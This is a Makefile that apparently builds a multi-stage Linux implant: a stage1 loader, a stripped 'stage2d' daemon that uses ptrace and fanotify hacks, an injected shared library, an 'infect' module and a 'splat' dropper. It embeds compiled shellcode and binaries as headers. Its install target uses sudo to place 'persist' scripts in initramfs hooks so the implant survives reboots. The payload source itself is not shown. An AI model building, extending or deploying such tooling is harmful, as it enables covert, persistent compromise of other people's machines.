all: stage2d injected.so stage1 splat Makefile

CFLAGS = -Os -D_FORTIFY_SOURCE=2 -fvisibility=hidden -fstack-protector-all -Wall -fPIC

INJECTED_OBJ=injected.o mlog.o infect.o

DAEMON_OBJ = stage2d.o mlog.o fanotify_hax.o libptrace_do.o loader.o parse_maps.o find_audit.o

STAGE1_OBJ = stage1.o mlog.o z.o

SPLAT_OBJ = splat.o infect.o mlog.o

%.o: %.c Makefile
	$(CC) $(CFLAGS) -c -o $@ $< 

loader.o: loader.h injected.h payload.h

splat.o : stage2.h stage1.h stage2d.h order.h efi_stuff.h

order.h: ORDER
	xxd -i ORDER order.h

busybox.h: /bin/busybox
	xxd -i /bin/busybox busybox.h

stage1.h: stage1
	strip stage1
	xxd -i stage1 stage1.h

stage2d.gz: stage2d
	strip stage2d
	cat stage2d|gzip -9>stage2d.gz

stage2d.h: stage2d
	xxd -i stage2d stage2d.h

stage2.h: stage2d.gz
	xxd -i stage2d.gz stage2.h

injected.h: Makefile injected.so
	strip injected.so
	xxd -i injected.so injected.h

payload.h: Makefile payload.asm
	nasm -felf64 payload.asm
	objcopy -O binary -j .text payload.o payload.bin
	xxd -i payload.bin payload.h

stage2d: Makefile $(DAEMON_OBJ) payload.h
	$(CC) $(CFLAGS) -fPIE -o stage2d $(DAEMON_OBJ) -ldl
	strip stage2d

stage1: Makefile $(STAGE1_OBJ)
	$(CC) $(CFLAGS) -fPIE -o stage1 $(STAGE1_OBJ) -lz
	strip stage1

splat: Makefile $(SPLAT_OBJ) 
	$(CC) $(CFLAGS) -fPIE -o splat $(SPLAT_OBJ)
	strip splat

injected.so: Makefile $(INJECTED_OBJ)
	$(CC) $(CFLAGS) -shared -o injected.so $(INJECTED_OBJ) -ldl

install: stage2d
	sudo cp -v debug_utils/persist /usr/share/initramfs-tools/scripts/init-bottom/persist
	sudo cp -v debug_utils/persist-hook /usr/share/initramfs-tools/hooks/persist

uninstall:
	sudo rm -v /usr/share/initramfs-tools/scripts/init-bottom/persist /usr/share/initramfs-tools/hooks/persist

.PHONY: clean
clean:
	-rm *.o splat stage1 stage1.h stage2.h stage2d stage2d.h order.h stage2d.gz injected.so injected.h payload.h payload.bin; true

